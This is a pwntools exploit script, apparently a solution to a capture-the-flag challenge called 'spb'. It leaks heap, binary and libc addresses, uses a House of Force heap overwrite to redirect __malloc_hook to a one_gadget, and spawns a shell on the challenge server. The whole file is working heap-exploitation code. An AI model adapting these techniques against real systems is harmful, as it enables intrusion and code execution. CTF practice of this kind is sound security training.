#!/usr/bin/env python3

from pwn import *

exe = ELF("spb", checksec=False)
libc = ELF("libc-2.27.so",checksec=False)
ld = ELF("./ld-2.27.so",checksec=False)

context.binary = exe

def leak(r):
	r.sendlineafter("> ", "3")
	r.recvuntil("You sang ")
	return int(r.recv(14).decode(), 16)

def malloc(r, size, data):
	r.sendlineafter("> ", "1")
	r.sendlineafter('> ', str(size))
	if size > 0:
		r.sendlineafter("> ", data)
	else:
		pass

def write_zero_four(r, from_1_to_4,index):
	r.sendlineafter("> ", "2")
	r.sendlineafter("> ", str(index))		# < size
	r.sendlineafter("> ", str(from_1_to_4))

def offset(address_you_want, wilderness_addr):
	return address_you_want - wilderness_addr - 0x10

def main():
    #r = process("./spb")
    r = remote("challenge.rgbsec.xyz", 6969)

    r.sendlineafter("> ", "0")
    r.sendlineafter("> ", "Maher")

    binary = leak(r) - 0xf08
    log.info("Binary base address is @ 0x%x", binary)
    bss = binary + 0x202048


    malloc(r, 0x18, 'AAAA')
    heap = leak(r) & ~0xfff
    top = heap + 0x290
    log.info("Heap base address is @ 0x%x", heap)
    log.info("Top chunk is @ 0x%x", top)
   

    malloc(r, offset(bss, top), "DDDD")
    malloc(r, 26363136, "L") #
    libc_b = leak(r)
    log.info("Libc leaked is @@ 0x%x", libc_b)
    libc_base = libc_b - 0x10 + 0x1925000
    log.info("Libc base address @ 0x%x", libc_base)


    malloc_hook = libc_base + libc.sym['__malloc_hook']
    log.info("Malloc hook @ 0x%x" , malloc_hook)
    malloc(r, 0x10, p64(bss+8) + b"M"*0x8)
    r.sendlineafter("> ", "2")
    r.sendlineafter("> ", "0")
    r.sendlineafter("> ", "-1")



    malloc(r, offset(malloc_hook - 0x18 ,bss + 0x18), b"")
    one_gadget = libc_base + 0x4f3c2

    log.info("One gadget is @ 0x%x", one_gadget)

    r.sendlineafter("> ", "1")
    r.sendlineafter("> ", str(0x30))
    r.sendlineafter("> ", b"M"*8 + p64(one_gadget) + p64(libc_base + libc.sym["__GI___libc_realloc"] + 0x9))
    print("Im already here")

    malloc(r, 0, "")
    r.interactive()


if __name__ == "__main__":
    main()

